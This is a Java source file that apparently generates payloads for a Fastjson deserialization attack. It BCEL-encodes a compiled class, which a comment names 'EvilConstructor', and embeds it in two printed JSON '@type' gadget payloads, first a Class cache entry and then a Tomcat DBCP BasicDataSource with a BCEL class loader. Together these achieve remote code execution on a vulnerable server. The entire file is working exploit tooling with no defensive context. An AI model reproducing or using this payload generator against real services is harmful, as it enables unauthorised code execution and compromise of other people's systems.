package com.example;

import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;

import java.net.URL;
import java.net.URLClassLoader;

public class App {
    public static void main( String[] args ) throws  Exception{
        String classFilePath = args[0];
        String className = args[1];
        //URL url = new URL("file:///D:/codes/BcelGenerator/target/classes/EvilConstructor.class");
        URL url = new URL(classFilePath);
        URLClassLoader classLoader = new URLClassLoader(new URL[]{url});
        Class evilClass = classLoader.loadClass(className);
        JavaClass cls = Repository.lookupClass(evilClass);
        String codes = Utility.encode(cls.getBytes(), true);

        String payload_1 = "{\"name\": {\"@type\":\"java.lang.Class\",\"val\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"}}";
        String payload_2 = "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\"},\"f\":{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\", \"driverClassName\": \"org.apache.log4j.spi$$BCEL$$" + codes + "\", \"driverClassLoader\":{\"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"}}, \"age\":10}";

        System.out.println("第一个包：");
        System.out.println(payload_1);
        System.out.println("第二个包：");
        System.out.println(payload_2);
    }
}
